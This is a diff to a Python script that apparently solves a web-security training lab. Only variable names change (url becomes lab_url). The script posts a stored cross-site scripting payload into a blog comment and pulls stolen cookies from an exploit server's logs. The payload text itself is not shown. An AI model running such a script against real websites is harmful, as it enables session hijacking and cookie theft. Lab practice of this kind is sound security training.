@@ -26,7 +26,7 @@ import base64
 #######################################################
 # Function used to inject XSS in comment functionality
 #######################################################
-def exploit_xss_in_comment_functionality(url, exploit_server_url):
+def exploit_xss_in_comment_functionality(lab_url, exploit_server_url):
     # set data to send via POST
     data = {
         "postId": "2",
@@ -38,7 +38,7 @@ def exploit_xss_in_comment_functionality(url, exploit_server_url):
 
     try:
         # inject payload in a comment
-        res = requests.post(f"{url}/post/comment", data)
+        res = requests.post(f"{lab_url}/post/comment", data)
 
     except:
         print(Fore.RED + "Failed to exploit XSS through exception")
@@ -87,14 +87,14 @@ def extract_cookie_from_logs(exploit_server_url):
 ###########
 
 # change this to your lab URL
-url = "https://0acb00d103d36d7580f2a39000990080.web-security-academy.net"
+lab_url = "https://0acb00d103d36d7580f2a39000990080.web-security-academy.net"
 
 # change this to your exploit server URL
 exploit_server_url = "https://exploit-0a0a0081035a6d118001a22d01170006.exploit-server.net"
 
 
 # try to inject the XSS payload
-is_exploited = exploit_xss_in_comment_functionality(url, exploit_server_url) 
+is_exploited = exploit_xss_in_comment_functionality(lab_url, exploit_server_url) 
 
 # if the payload is injected successfully
 if is_exploited: 
